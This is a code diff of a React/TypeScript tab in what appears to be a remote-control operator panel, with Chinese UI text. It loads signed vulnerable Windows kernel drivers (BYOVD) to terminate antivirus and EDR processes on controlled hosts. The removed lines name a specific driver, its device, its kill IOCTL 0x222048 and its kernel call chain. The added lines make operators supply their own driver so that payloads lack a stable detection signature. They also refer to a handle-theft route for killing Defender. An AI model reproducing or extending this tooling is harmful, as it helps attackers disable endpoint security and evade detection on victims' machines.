@@ -37,13 +37,16 @@ export function AVDetectTab({ session }: { session: Session }) {
   const [edrMsg, setEdrMsg] = useState('')
   const [edrProcesses, setEdrProcesses] = useState('')
   const [byovdB64, setByovdB64] = useState('')
-  const [byovdSvc, setByovdSvc] = useState('tsdrv')
+  const [byovdSvc, setByovdSvc] = useState('')
+  /** 设备名（不含 \\.\ 前缀）与终止 IOCTL：加载驱动时一并上报，服务端登记为驱动档案 */
+  const [byovdDev, setByovdDev] = useState('')
+  const [byovdIoctl, setByovdIoctl] = useState('')
   const [byovdFile, setByovdFile] = useState('')
   const [builtinDrivers, setBuiltinDrivers] = useState<BuiltinDriver[]>([])
   const [builtinLoading, setBuiltinLoading] = useState('')
   /** BYOVD 击杀目标：PID 或进程名 */
   const [byovdKillTarget, setByovdKillTarget] = useState('')
-  /** BYOVD 击杀使用的内置驱动（默认取内置的 kill 用途驱动） */
+  /** 驱动击杀使用的驱动（默认用本次加载登记的驱动档案） */
   const [byovdKillDriver, setByovdKillDriver] = useState('')
   const loadedRef = useRef(false)
 
@@ -203,23 +206,36 @@ export function AVDetectTab({ session }: { session: Session }) {
       setEdrMsg('请先选择 .sys 驱动文件')
       return undefined
     }
+    if (!byovdSvc.trim()) {
+      setEdrMsg('请填写服务名（SCM 服务名，加载后用于卸载）')
+      return undefined
+    }
+    // 设备名与终止 IOCTL 一并上报：服务端据此登记"本会话驱动档案"，
+    // 后续「驱动击杀」直接用该档案，无需每次手填。
     const r = await sessionApi.byovdLoad(session.id, {
       driver_b64: byovdB64,
-      service_name: byovdSvc || undefined,
+      service_name: byovdSvc.trim(),
+      name: byovdFile || undefined,
+      device_name: byovdDev.trim() || undefined,
+      kill_ioctl: byovdIoctl.trim() || undefined,
     })
     return r.data?.task_id
   })
 
-  /** 一键加载内置驱动：服务器嵌入的原厂签名驱动 → base64 → byovd_load */
+  /** 加载服务端 drivers/ 目录里的驱动（驱动由操作员自行放置，服务端不再内置） */
   const loadBuiltinDriver = (d: BuiltinDriver) => runTask(async () => {
     setBuiltinLoading(d.name)
-    setByovdSvc(d.service) // 记录服务名，便于后续「卸载驱动」
+    if (d.service) setByovdSvc(d.service)
+    if (d.device) setByovdDev(d.device.replace(/^\\\\\.\\/, ''))
+    if (d.ioctl) setByovdIoctl('0x' + d.ioctl.toString(16).toUpperCase())
     try {
       const buf = await driversApi.raw(d.name)
       const r = await sessionApi.byovdLoad(session.id, {
         driver_b64: arrayBufferToBase64(buf),
         service_name: d.service,
-        device_name: d.device.replace(/^\\\\\.\\/, ''),
+        name: d.name,
+        device_name: d.device ? d.device.replace(/^\\\\\.\\/, '') : undefined,
+        kill_ioctl: d.ioctl ? '0x' + d.ioctl.toString(16).toUpperCase() : undefined,
       })
       return r.data?.task_id
     } finally {
@@ -232,7 +248,7 @@ export function AVDetectTab({ session }: { session: Session }) {
     return r.data?.task_id
   })
 
-  /** BYOVD 击杀：优先用内置 kgameprotect 驱动（无鉴权进程终止 IOCTL） */
+  /** 驱动击杀：使用操作员提供的驱动（设备名/IOCTL 由服务端从驱动档案下发） */
   const byovdKill = () => runTask(async () => {
     const target = byovdKillTarget.trim()
     if (!target) {
@@ -380,30 +396,31 @@ export function AVDetectTab({ session }: { session: Session }) {
 
         <div style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', lineHeight: 1.8, marginBottom: 12 }}>
           <div>
-            内置驱动 <code style={codeStyle}>kgameprotect.sys</code>（WHQL 签名，AMD64）：设备
-            <code style={codeStyle}>\\.\kgameprotect</code>，暴露一个**无鉴权进程终止 IOCTL**
-            <code style={codeStyle}>0x222048</code>（METHOD_BUFFERED / FILE_ANY_ACCESS，入参首个 DWORD = PID）。
-            驱动内部直接 <code style={codeStyle}>PsLookupProcessByProcessId → ObOpenObjectByPointer(PROCESS_TERMINATE) → ZwTerminateProcess</code>，
-            因此**不需要调用方持有目标进程的 PROCESS_TERMINATE 权限**，可用于击杀普通杀软/EDR 进程。
+            本版本**不再内置任何驱动**（内置即等于把驱动名与 IOCTL 明文写进服务端与每个载荷，是最稳定的查杀特征）。
+            请自行准备已签名的易受攻击驱动 <code style={codeStyle}>*.sys</code>：放到服务端
+            <code style={codeStyle}>drivers/</code> 目录（或 <code style={codeStyle}>data/drivers/</code>），配 <code style={codeStyle}>manifest.json</code>
+            声明 <code style={codeStyle}>device/service/ioctl</code>；也可以直接在下面选择 .sys 上传并手填这几项。
           </div>
           <div style={{ marginTop: 6 }}>
-            限制：该驱动**只提供进程终止**，没有任意内核读写能力，因此**对 PPL 保护进程无效**（它拦不住内核句柄检查）；
-            PPL 保护进程（如 Defender 的 MsMpEng）请走上方「PPL 击杀」的**句柄窃取**路线。
+            常见「进程终止型」驱动：暴露一个无鉴权终止 IOCTL（METHOD_BUFFERED，入参首个 DWORD = PID），驱动内部
+            <code style={codeStyle}>PsLookupProcessByProcessId → ObOpenObjectByPointer(PROCESS_TERMINATE) → ZwTerminateProcess</code>，
+            因此不需要调用方持有目标进程权限，可用于击杀普通杀软/EDR 进程；**对 PPL 保护进程无效**（那类走上方「PPL 击杀」的句柄窃取路线）。
           </div>
           <div style={{ marginTop: 6 }}>
-            SHA-256 <code style={codeStyle}>{builtinDrivers[0]?.sha256 || '6c1d596d18213e24f0c88d58ea7f3ca24114eded806b6198a8abc701251126ee'}</code>
-            （与 LOLDrivers PR #428 记录一致；可自行用 <code style={codeStyle}>signtool verify /pa</code> 复核签名）。
-            加载后记得「卸载驱动」清理内核服务与文件。
+            加载前请自行核对 SHA-256 与签名（<code style={codeStyle}>signtool verify /pa /all your.sys</code>）；加载后记得点「卸载驱动」清理内核服务与文件。
+            服务端只做透传与档案登记，不对驱动合法性背书。
           </div>
         </div>
 
-        {/* 内置驱动一键加载 */}
+        {/* 服务端 drivers/ 目录里已放置的驱动（操作员自备） */}
         <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap', marginBottom: 12 }}>
           <span style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', display: 'inline-flex', alignItems: 'center', gap: 4 }}>
-            <Package size={13} /> 内置驱动（一键加载）：
+            <Package size={13} /> 服务端 drivers/ 目录：
           </span>
           {builtinDrivers.length === 0 && (
-            <span style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)' }}>未读取到内置驱动列表</span>
+            <span style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)' }}>
+              目录为空（把 .sys 放进去并刷新，或在下方直接上传）
+            </span>
           )}
           {builtinDrivers.map(d => (
             <button
@@ -411,7 +428,7 @@ export function AVDetectTab({ session }: { session: Session }) {
               className="btn-small"
               onClick={() => loadBuiltinDriver(d)}
               disabled={edrBusy || builtinLoading !== ''}
-              title={`${d.description}\n设备: ${d.device}  服务名: ${d.service}\n用途: ${d.purpose || 'kill'}\nIOCTL: ${d.ioctl !== undefined ? '0x' + d.ioctl.toString(16) : '-'}\nSHA256: ${d.sha256}`}
+              title={`${d.description || '（manifest 未写 description）'}\n设备: ${d.device || '（未声明）'}  服务名: ${d.service || '（未声明）'}\n用途: ${d.purpose || '（未声明）'}\nIOCTL: ${d.ioctl ? '0x' + d.ioctl.toString(16).toUpperCase() : '（未声明）'}\nSHA256: ${d.sha256}`}
               style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}
             >
               <Skull size={13} />
@@ -426,7 +443,7 @@ export function AVDetectTab({ session }: { session: Session }) {
         {/* 击杀进程 */}
         <div style={{ padding: '10px 12px', border: '1px solid var(--border, #3a3a4a)', borderRadius: 6, background: 'var(--bg-deep, #12121a)', marginBottom: 12 }}>
           <div style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)', marginBottom: 8 }}>
-            击杀目标进程（PID 或进程名）：驱动加载后调用 IOCTL <code style={codeStyle}>0x222048</code> 终止目标
+            击杀目标进程（PID 或进程名）：使用本次加载登记的驱动档案（设备名 + 终止 IOCTL）
           </div>
           <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
             <input
@@ -461,12 +478,29 @@ export function AVDetectTab({ session }: { session: Session }) {
             type="text"
             value={byovdSvc}
             onChange={(e) => setByovdSvc(e.target.value)}
-            placeholder="服务名（如 kgameprotect）"
-            style={{ width: 160, padding: '8px 10px', borderRadius: 6, border: '1px solid var(--border, #3a3a4a)', background: 'var(--bg-elevated, #1e1e2a)', color: 'var(--text, #e5e5ea)', fontSize: 12 }}
+            placeholder="服务名 *（SCM 服务名，用于卸载）"
+            style={{ ...inputStyle, width: 200 }}
+          />
+          <input
+            type="text"
+            value={byovdDev}
+            onChange={(e) => setByovdDev(e.target.value)}
+            placeholder="设备名（如 yourdrv，不含 \\.\）"
+            style={{ ...inputStyle, width: 190 }}
+          />
+          <input
+            type="text"
+            value={byovdIoctl}
+            onChange={(e) => setByovdIoctl(e.target.value)}
+            placeholder="终止 IOCTL（如 0x222048）"
+            style={{ ...inputStyle, width: 180 }}
           />
           <button className="btn-primary" onClick={loadDriver} disabled={edrBusy || !byovdB64} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
             <Skull size={14} /> 加载驱动
           </button>
+        </div>
+        <div style={{ fontSize: 11, color: 'var(--text-dim, #9a9aab)', marginTop: 6 }}>
+          设备名与终止 IOCTL 只在「驱动击杀」时使用；填了就会被登记为本次会话的驱动档案（也可留空，届时击杀请求需自带 device/ioctl）。
         </div>
       </div>
     </div>
